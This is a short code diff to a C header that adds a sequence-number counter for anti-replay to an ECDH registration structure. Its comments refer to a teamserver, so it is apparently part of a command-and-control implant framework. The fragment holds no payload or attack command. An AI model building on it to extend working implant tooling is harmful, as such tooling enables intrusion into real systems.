@@ -202,6 +202,7 @@ typedef struct
         UINT8  ConnectionId[16];  /* 16-byte routing token from teamserver */
         PVOID  RegPacket;         /* raw ECDH registration packet buffer  */
         SIZE_T RegPacketLen;      /* length of RegPacket in bytes         */
+        UINT64 SeqNum;            /* monotonic packet counter for anti-replay */
     } ECDH;
 #endif
 
